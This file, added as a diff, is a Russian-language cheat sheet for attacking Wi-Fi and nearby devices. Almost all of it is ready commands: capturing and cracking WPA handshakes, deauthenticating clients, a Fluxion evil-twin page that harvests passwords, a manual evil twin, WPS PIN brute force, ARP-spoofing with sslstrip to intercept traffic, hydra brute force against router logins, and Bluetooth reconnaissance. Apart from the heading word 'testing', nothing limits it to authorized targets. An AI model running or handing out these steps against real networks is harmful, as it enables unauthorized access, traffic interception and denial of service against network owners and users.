@@ -1,0 +1,196 @@
+Тестирование WiFi сетей
+#Способ 1
+
+1) Запустить Kali 
+2) Вставить USB-адаптер
+3) wifite --kill
+4) Дождаться появления нужной сети в списке (должен быть как минимум один подключенный пользователь)
+5) Ctrl + C 		//остановка сканирования
+6) Ввести номер нужной сети
+7) Дождаться проведения процедуры взлома
+7.1) Ctrl + C		//пропустить одну атаку 
+8) Если подбор удался, то пароль от сети будет выведен в терминале (файл с копией пароля появится в папке /Home)
+9) Если пароль слишком сложный, то можно воспользоваться другими программами для перебора. Захваченый хендшейк будет в папке /Home/hs
+10) service network-manager start		//подключаем сети обратно
+
+
+
+#Способ 2
+1) Запустить Kali
+2) Вставить USB-адаптер
+2.1)ifconfig		//список адаптеров
+3) airmon-ng check kill		//отключаем проводные сети
+4) airmon-ng start wlan0
+5) airodump-ng wlan0mon
+5.1) airodump-ng --manufacturer --uptime --wps wlan0mon		//для получения дополнительных сведений о сети (модель роутера, время онлайн, WPS)
+6) Ctrl + C		//остановка сканирования 
+7) airodump-ng -c <номер канала CH> --bssid <MAC роутера> -w Documents/handshakes/<название сети> wlan0mon	//Уведомление появится после переподключения устройства в правом верхнем углу
+8) aireplay-ng -0 <кол-во запросов> -a <MAC роутера> -c <MAC клиента> wlan0mon		//отключаем пользователя от сети (ЗАПУСКАТЬ В ОТДЕЛЬНОМ ТЕРМИНАЛЕ)
+9) Файл с хендшейком сохраниться в папке Documents/handshakes. Настоятельно рекомендуется сделать копию перед взломом
+8) service network-manager start		//подключаем сети обратно
+
+
+
+#Работа с Хендшейком
+1) wpaclean Documents/handshakes/clean/<название.cap> Documents/handshakes/<название_файла.cap>		//очистка хендшейка 
+2) Скопировать/записать MAC-адресс 
+
+
+
+#Расшифровка 
+1) aircrack-ng -w Documents/dict/<словарь> -b <MAC-адрес сети> Documents/handshakes/clean/<файл>
+
+#HashCat
+1) https://hashcat.net/cap2hccapx/ 
+2) hashcat -m 2500 --hwmon-temp-abort=85 -w <скорость1-3> <clean hs> <словари через пробел>
+
+
+
+#Cпособ 3 (СИ)
+0) apt update
+0.1) git clone https://github.com/FluxionNetwork/fluxion --recursive 
+0.2) cd fluxion
+0.3) ./fluxion.sh
+0.4) ./fluxion.sh -i		//в случае если что-то из списка не установлено
+1) systemctl stop NetworkManager.service
+2) airmon-ng check kill
+3) ./fluxion.sh
+4) 2
+5) 35
+6) номер нужной сети без левых нулей
+7) 3		//выбор адаптера для атаки
+8) 2		//выбор метода получения хендшейка через airplay-ng
+9) выбор адапера для глушения (по возможности использовать отличный от использованного ранее)
+10) 3		//проверка хендшейка
+11) 1		//частота проверки 30 секунд
+12) 1		//если тянет железо
+13) Открыть новое окно
+14) ./fluxion.sh
+15) 1		//атака "злой двойник"
+16) нужная сеть? y/n
+17) если 2 адаптера - выбирать менее мощный
+18) более мощный адаптер
+19) то, что выбрали в п.18
+20) 1		//рекомендуемый метод
+21) 3
+22) создать ssl сертификат
+23) 1		//без интернета
+24) выбрать тип страницы на нужном языке
+25) интересное окно FLUXION AP Authentificator		//пароль появится там-же
+
+
+
+#PassGen (создание нового словаря паролей, на базе информации о владельце)
+1) cd PassGen		//переход в каталог с программой
+2) python3.7 ./passgen.py		//запуск программы
+3) Заполнить известные данные
+4) Лист будет сохранен в папке /Home/PassGen/
+
+
+
+#crunch (взлом handshake с паролем не из списка) рекомендуется прочитать crunch man
+1) crunch <min длина> <max длина> -t <предполагаемый пароль> <символы> | aircrack-ng -w - <хендшейк> -e <название сети>
+
+
+
+#Dos-атака
+1) вставить адаптер 
+2) включить режим монтироа
+3) airodump-ng wlan0mon
+4) скопировать BSSID
+5) aireplay-ng -0 <кол-во пакетов> -a <BSSID> wlan0mon	// 0 - до выключения
+
+Смена канала
+1)airmon-ng stop wlan0mon
+2)sudo iwconfig channel <цифра>
+3)airmon-ng start wlan0mon
+
+или 
+
+1) ./monitor.sh
+2) airodump-ng wlan0
+3) aireplay-ng -0 <кол-во пакетов> -a <BSSID> wlan0
+
+Смена канала
+1) iwconfig channel <цифра>
+
+или
+
+1)./jam.sh (отредактировать под задачу)
+
+
+
+#Мониторинг сетей + информация о них
+1) включить режим мониторинга
+2) wash -i wlan0mon
+
+
+
+#WiFi по PIN (можно найти готовые WPS алгоритмы для вычисления пина по модели роутера)
+1) reaver -b <bssid> -i wlan0 (-c <номер канала>) -r <попыток>:<секунд>
+
+
+
+#MAC-адресс
+1) macchanger -h <интерфейс>
+
+
+
+#MITM
+0) apt install dsniff
+1) echo 1 > /proc/sys/net/ipv4/ip_forward		//1 раз
+2) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 //1 раз
+3) iptables -t nat -L PREROUTING		//проверяем наличие строчки
+4) nmap <###.###.###.###>-254 -O -vv	//сканирование сети (-О отображает также и ОС устройств)
+5) arpspoof -i wlan0 -t <ip router> -r <ip target>	//в одном окне
+6) tail -f sslstrip.log	//в другом окне записываем перехваченый трафик в лог файл
+
+
+
+#Evil Twin
+0) apt install bridge-utils
+1) включить режим мониторинга
+2) airbase-ng -a <bssid>  --essid <название> -c <номер канала> <интерфейс>
+3) aireplay-ng -0 0 -a <bssid> <интерфейс>
+4) brctl addbr <name>
+5) brctl addif <name> <ethernet interface>
+6) brctl addif <name> at0
+7) ifconfig at0 0.0.0.0 up
+8) ifconfig <name> up
+9) dhclient <name> &
+
+
+
+#hydra (Брутфорс авторизации на сайтах)
+1) hydra <username> -P <passlist> <ipadress> http-get -m / -V 		//router
+
+#Информация из методанных из изображения
+0) apt install exif
+1) exif <фотография> 	//выводит сведения о устройстве, на которое была сделана фотография
+или
+1) www.verexif.com	//так же можно удалить метаданные
+или
+1) www.exif.regex.info
+
+
+
+##################
+null byte
+##################
+
+# - # Identify & Target Bluetooth Devices with Bettercap
+0) apt install bettercap
+ble.recon on (Start BLE devices discovery)
+ble.recon off (Stop BLE devices discovery)
+ble.clear (clear all collected devices)
+ble.show (show all discovered devices)
+ble.enum MAC (info about device)
+ble.show.sort rssi/mac/seen asc/desc
+
+
+# 138 #
+1) hciconfig 		//ifconfig для bluetooth
+2) hcitool scan 	//сканирует все bluetooth устройства
+3) hcitool name <MAC>	//имя устройства
+4) sdptool browse <MAC> //информация об устройстве
+*5) bstscaner
